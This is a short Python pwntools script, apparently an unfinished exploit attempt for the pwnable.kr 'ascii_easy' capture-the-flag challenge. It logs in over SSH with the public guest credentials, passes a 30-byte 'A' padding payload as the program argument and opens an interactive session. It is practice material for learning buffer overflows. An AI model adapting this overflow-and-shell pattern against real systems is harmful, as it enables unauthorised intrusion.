from pwn import *
#context.log_level='debug'

s = ssh('ascii_easy','pwnable.kr',port=2222,password='guest')

argvs=[str(i) for i in range(2)]

payload = 'A'*30

argvs[1] = payload
p = s.process(executable='./ascii_easy',argv=argvs)

p.interactive()
